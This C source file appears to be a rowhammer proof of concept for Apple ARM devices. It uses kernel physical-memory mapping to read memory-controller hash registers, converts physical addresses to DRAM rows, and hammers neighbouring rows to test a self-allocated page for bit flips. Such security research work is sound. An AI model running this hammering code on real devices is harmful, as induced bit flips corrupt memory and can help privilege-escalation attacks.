/* Copyright 2021 0x7ff
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#include "golb.h"
#include <sys/sysctl.h>
#include <sys/utsname.h>

#define AMCC_SZ (0x4000)
#define AMCX_SZ (0x1000)
#define ROWHAMMER_ROUNDS (3)
#define IO_BASE (0x200000000ULL)
#define ROWHAMMER_CNT (1U << 16U)
#define SDRAM_BASE (0x800000000ULL)
#define ROWHAMMER_DOZEN (1U << 10U)

static bool has_amcx;
static golb_ctx_t amcc_ctx, amcx_ctx;
static size_t amcc_base_off, amcx_base_off, addrcfg_off, mcuchnhash0_off, mcuchnhash1_off, mcuchnhash2_off, addrmapmode_off;
static uint32_t ch_wid, ch_point, addrcfg, addrmapmode, mcuchnhash0, mcuchnhash1, mcuchnhash2, mcsaddrbankhash0 = 0x6DB6, mcsaddrbankhash1 = 0x5B6D, mcsaddrbankhash2 = 0x36DB;

static uint32_t
extract32(uint32_t val, unsigned start, unsigned len) {
	return (val >> start) & (~0U >> (32U - len));
}

static kern_return_t
init_arm_globals(void) {
	uint32_t cpufamily = CPUFAMILY_UNKNOWN;
	size_t len = sizeof(cpufamily);
	struct utsname uts;

	if(sysctlbyname("hw.cpufamily", &cpufamily, &len, NULL, 0) == 0 && uname(&uts) == 0) {
		switch(cpufamily) {
			case 0x2C91A47EU: /* CPUFAMILY_ARM_TYPHOON */
				if(strstr(uts.version, "T7001") != NULL) {
					ch_wid = 2;
				} else {
					ch_wid = 1;
				}
				has_amcx = true;
				amcx_base_off = 0x100000;
				addrcfg_off = 0x94;
				mcuchnhash0_off = 0x4A8;
				mcuchnhash1_off = 0x4AC;
				addrmapmode_off = 0x90;
				return KERN_SUCCESS;
			case 0x92FB37C8U: /* CPUFAMILY_ARM_TWISTER */
			case 0x67CEEE93U: /* CPUFAMILY_ARM_HURRICANE */
			case 0xE81E7EF6U: /* CPUFAMILY_ARM_MONSOON_MISTRAL */
				if(strstr(uts.version, "S8001") != NULL) {
					ch_wid = 3;
					addrcfg_off = 0x4CC;
					mcuchnhash2_off = 0x4B0;
					addrmapmode_off = 0x4C8;
				} else {
					if(strstr(uts.version, "T8011") != NULL) {
						ch_wid = 3;
						mcuchnhash2_off = 0x4B0;
					} else {
						ch_wid = 2;
					}
					addrcfg_off = 0x4C8;
					addrmapmode_off = 0x4C4;
				}
				mcuchnhash0_off = 0x4A8;
				mcuchnhash1_off = 0x4AC;
				return KERN_SUCCESS;
			case 0x07D34B9FU: /* CPUFAMILY_ARM_VORTEX_TEMPEST */
			case 0x462504D2U: /* CPUFAMILY_ARM_LIGHTNING_THUNDER */
			case 0x1B588BB3U: /* CPUFAMILY_ARM_FIRESTORM_ICESTORM */
				ch_wid = 2;
				addrcfg_off = 0x1014;
				mcuchnhash0_off = 0x1004;
				mcuchnhash1_off = 0x1008;
				mcuchnhash2_off = 0x100C;
				addrmapmode_off = 0x1010;
				return KERN_SUCCESS;
			default:
				break;
		}
	}
	return KERN_FAILURE;
}

static void
rowhammer_term(void) {
	golb_unmap(amcc_ctx);
	if(has_amcx) {
		golb_unmap(amcx_ctx);
	}
}

static kern_return_t
rowhammer_init(void) {
	if(golb_map(&amcc_ctx, IO_BASE + amcc_base_off, AMCC_SZ, VM_PROT_READ) == KERN_SUCCESS) {
		mcuchnhash0 = *(volatile uint32_t *)(amcc_ctx.virt + mcuchnhash0_off);
		printf("mcuchnhash0: 0x%" PRIX32 "\n", mcuchnhash0);
		ch_point = 6 + (uint32_t)__builtin_ctz(mcuchnhash0);
		printf("ch_point: 0x%" PRIX32 "\n", ch_point);
		if(ch_wid >= 2) {
			mcuchnhash1 = *(volatile uint32_t *)(amcc_ctx.virt + mcuchnhash1_off);
			printf("mcuchnhash1: 0x%" PRIX32 "\n", mcuchnhash1);
			if(ch_wid == 3) {
				mcuchnhash2 = *(volatile uint32_t *)(amcc_ctx.virt + mcuchnhash2_off);
				printf("mcuchnhash2: 0x%" PRIX32 "\n", mcuchnhash2);
			}
		}
		if(!has_amcx) {
			addrcfg = *(volatile uint32_t *)(amcc_ctx.virt + addrcfg_off);;
			printf("addrcfg: 0x%" PRIX32 "\n", addrcfg);
			addrmapmode = *(volatile uint32_t *)(amcc_ctx.virt + addrmapmode_off);
			printf("addrmapmode: 0x%" PRIX32 "\n", addrmapmode);
			return KERN_SUCCESS;
		}
		if(golb_map(&amcx_ctx, IO_BASE + amcx_base_off, AMCX_SZ, VM_PROT_READ) == KERN_SUCCESS) {
			addrcfg = *(volatile uint32_t *)(amcx_ctx.virt + addrcfg_off);;
			printf("addrcfg: 0x%" PRIX32 "\n", addrcfg);
			addrmapmode = *(volatile uint32_t *)(amcx_ctx.virt + addrmapmode_off);
			printf("addrmapmode: 0x%" PRIX32 "\n", addrmapmode);
			return KERN_SUCCESS;
		}
		golb_unmap(amcc_ctx);
	}
	return KERN_FAILURE;
}

static uint32_t
odd_parity(uint32_t in) {
	in = (in & 0xFFFFU) ^ (in >> 16U);
	in = (in & 0xFFU) ^ (in >> 8U);
	in = (in & 0xFU) ^ (in >> 4U);
	in = (in & 0x3U) ^ (in >> 2U);
	return (in & 0x1U) ^ (in >> 1U);
}

static kaddr_t
dram2phys(uint32_t ch, uint32_t rank, uint32_t bank, uint32_t row, uint32_t col) {
	uint32_t rank_wid = extract32(addrcfg, 24, 2), bank_wid = 2 + extract32(addrcfg, 0, 4), row_wid = 12 + extract32(addrcfg, 16, 4), col_wid = 8 + extract32(addrcfg, 8, 4), col_off = 2, row_off, bank_off, rank_off, addr, mask, chnhash;

	if(extract32(addrmapmode, 0, 1) == 0) {
		row_off = col_off + col_wid;
		bank_off = row_off + row_wid;
		rank_off = bank_off + bank_wid;
	} else if((bank_off = 6 + extract32(addrmapmode, 8, 5)) == col_off + col_wid) {
		rank_off = bank_off + bank_wid;
		row_off = rank_off + rank_wid;
	} else {
		mask = (1U << (bank_off - col_off)) - 1U;
		col = ((col & ~mask) << bank_wid) | (col & mask);
		rank_off = col_off + col_wid + bank_wid;
		row_off = rank_off + rank_wid;
	}
	bank ^= (odd_parity(row & ~mcsaddrbankhash2) << 2U) | (odd_parity(row & ~mcsaddrbankhash1) << 1U) | odd_parity(row & ~mcsaddrbankhash0);
	addr = (rank << rank_off) | (bank << bank_off) | (row << row_off) | (col << col_off);
	mask = (1U << ch_point) - 1U;
	addr = ((addr & ~mask) << ch_wid) | (addr & mask);
	chnhash = (ch << (ch_point - 6U)) | (addr >> 6U);
	ch = odd_parity(chnhash & mcuchnhash0);
	if(ch_wid >= 2) {
		ch |= odd_parity(chnhash & mcuchnhash1) << 1U;
		if(ch_wid == 3) {
			ch |= odd_parity(chnhash & mcuchnhash2) << 2U;
		}
	}
	addr |= (ch & ((1U << ch_wid) - 1U)) << ch_point;
	return SDRAM_BASE + addr;
}

static kern_return_t
phys2dram(kaddr_t phys, uint32_t *ch, uint32_t *rank, uint32_t *bank, uint32_t *row, uint32_t *col) {
	uint32_t rank_wid = extract32(addrcfg, 24, 2), bank_wid = 2 + extract32(addrcfg, 0, 4), row_wid = 12 + extract32(addrcfg, 16, 4), col_wid = 8 + extract32(addrcfg, 8, 4), col_off = 2, bank_off, addr = (uint32_t)(phys - SDRAM_BASE), mask;

	mask = (1U << ch_point) - 1U;
	addr = ((addr >> ch_wid) & ~mask) | (addr & mask);
	*col = addr >> col_off;
	if(extract32(addrmapmode, 0, 1) == 0) {
		*row = *col >> col_wid;
		*bank = *row >> row_wid;
		*rank = *bank >> bank_wid;
	} else if((bank_off = 6 + extract32(addrmapmode, 8, 5)) == col_off + col_wid) {
		*bank = addr >> bank_off;
		*rank = *bank >> bank_wid;
		*row = *rank >> rank_wid;
	} else {
		*bank = addr >> bank_off;
		*rank = *col >> (col_wid + bank_wid);
		*row = *rank >> rank_wid;
		mask = (1U << (bank_off - col_off)) - 1U;
		*col = ((*col >> bank_wid) & ~mask) | (*col & mask);
	}
	*rank &= (1U << rank_wid) - 1U;
	*row &= (1U << row_wid) - 1U;
	*bank &= (1U << bank_wid) - 1U;
	*bank ^= (odd_parity(*row & ~mcsaddrbankhash2) << 2U) | (odd_parity(*row & ~mcsaddrbankhash1) << 1U) | odd_parity(*row & ~mcsaddrbankhash0);
	*col &= (1U << col_wid) - 1U;
	for(*ch = 0; *ch < 1U << ch_wid; ++*ch) {
		if(dram2phys(*ch, *rank, *bank, *row, *col) == phys) {
			return KERN_SUCCESS;
		}
	}
	return KERN_FAILURE;
}

static kern_return_t
rowhammer(kaddr_t target_phys) {
	uint32_t row_0, row_1, row_2, target_ch, target_rank, target_bank, target_row, target_col;
	uint8_t t0, t1, *target = malloc(vm_page_size);
	golb_ctx_t ctx_0, ctx_1, ctx_2, target_ctx;
	kaddr_t phys_0, phys_1, phys_2;
	bool flipped = false;
	size_t i, j, k;

	if(target != NULL) {
		if(golb_map(&target_ctx, target_phys, vm_page_size, VM_PROT_READ) == KERN_SUCCESS) {
			for(i = 0; i < vm_page_size; ++i) {
				target[i] = ((const volatile uint8_t *)target_ctx.virt)[i];
			}
			__asm__ volatile("dmb ish" ::: "memory");
			__builtin_prefetch(target);
			if(phys2dram(target_phys, &target_ch, &target_rank, &target_bank, &target_row, &target_col) == KERN_SUCCESS) {
				printf("target_ch: 0x%" PRIX32 ", target_rank: 0x%" PRIX32 ", target_bank: 0x%" PRIX32 ", target_row: 0x%" PRIX32 ", target_col: 0x%" PRIX32 "\n", target_ch, target_rank, target_bank, target_row, target_col);
				if(target_row >= 3) {
					row_0 = target_row - 1;
					row_1 = target_row - 2;
					row_2 = target_row - 3;
				} else {
					row_0 = target_row + 1;
					row_1 = target_row + 2;
					row_2 = target_row + 3;
				}
				if((phys_0 = dram2phys(target_ch, target_rank, target_bank, row_0, target_col)) != 0) {
					printf("phys_0: " KADDR_FMT "\n", phys_0);
					if(golb_map(&ctx_0, phys_0, 1, VM_PROT_READ) == KERN_SUCCESS) {
						if((phys_1 = dram2phys(target_ch, target_rank, target_bank, row_1, target_col)) != 0) {
							printf("phys_1: " KADDR_FMT "\n", phys_1);
							if(golb_map(&ctx_1, phys_1, 1, VM_PROT_READ) == KERN_SUCCESS) {
								if((phys_2 = dram2phys(target_ch, target_rank, target_bank, row_2, target_col)) != 0) {
									printf("phys_2: " KADDR_FMT "\n", phys_2);
									if(golb_map(&ctx_2, phys_2, 1, VM_PROT_READ) == KERN_SUCCESS) {
										for(i = 0; !flipped && i < ROWHAMMER_ROUNDS; ++i) {
											for(j = 0; j < ROWHAMMER_CNT; ++j) {
												for(k = 0; k < ROWHAMMER_DOZEN; ++k) {
													*(const volatile uint8_t *)ctx_0.virt;
													*(const volatile uint8_t *)ctx_2.virt;
												}
												*(const volatile uint8_t *)ctx_1.virt;
											}
											for(j = 0; j < vm_page_size; ++j) {
												if((t0 = target[j]) != (t1 = ((const volatile uint8_t *)target_ctx.virt)[j])) {
													printf("t0: %02" PRIX8 ", t1: %02" PRIX8 "\n", t0, t1);
													flipped = true;
												}
											}
										}
										golb_unmap(ctx_2);
									}
								}
								golb_unmap(ctx_1);
							}
						}
						golb_unmap(ctx_0);
					}
				}
			}
			golb_unmap(target_ctx);
		}
		free(target);
	}
	return flipped ? KERN_SUCCESS : KERN_FAILURE;
}

static int
rowhammer_test(void) {
	kaddr_t target_virt, target_phys;
	int ret = EXIT_FAILURE;
	golb_ctx_t target_ctx;
	size_t i;

	if(mach_vm_allocate(mach_task_self(), &target_virt, vm_page_size, VM_FLAGS_ANYWHERE) == KERN_SUCCESS) {
		printf("target_virt: " KADDR_FMT "\n", target_virt);
		*(volatile uint8_t *)target_virt = 0xB4;
		if((target_phys = golb_find_phys(target_virt)) != 0) {
			printf("target_phys: " KADDR_FMT "\n", target_phys);
			if(golb_map(&target_ctx, target_phys, vm_page_size, VM_PROT_WRITE) == KERN_SUCCESS) {
				for(i = 0; i < vm_page_size; ++i) {
					((volatile uint8_t *)target_virt)[i] = 0xB4;
				}
				__asm__ volatile("dmb ish" ::: "memory");
				if(rowhammer(target_phys) == KERN_SUCCESS) {
					ret = 0;
				}
				golb_unmap(target_ctx);
			}
		}
		mach_vm_deallocate(mach_task_self(), target_virt, vm_page_size);
	}
	return ret;
}

int
main(void) {
	int ret = EXIT_FAILURE;

	if(init_arm_globals() == KERN_SUCCESS) {
		printf("amcc_base_off: 0x%zX, amcx_base_off: 0x%zX, ch_wid: 0x%" PRIX32 ", mcsaddrbankhash0: 0x%" PRIX32 ", mcsaddrbankhash1: 0x%" PRIX32 ", mcsaddrbankhash2: 0x%" PRIX32 ", addrcfg_off: 0x%zX, mcuchnhash0_off: 0x%zX, mcuchnhash1_off: 0x%zX, mcuchnhash2_off: 0x%zX, addrmapmode_off: 0x%zX\n", amcc_base_off, amcx_base_off, ch_wid, mcsaddrbankhash0, mcsaddrbankhash1, mcsaddrbankhash2, addrcfg_off, mcuchnhash0_off, mcuchnhash1_off, mcuchnhash2_off, addrmapmode_off);
		if(golb_init(0, NULL, NULL) == KERN_SUCCESS) {
			if(rowhammer_init() == KERN_SUCCESS) {
				ret = rowhammer_test();
				rowhammer_term();
			}
			golb_term();
		}
	}
	return ret;
}
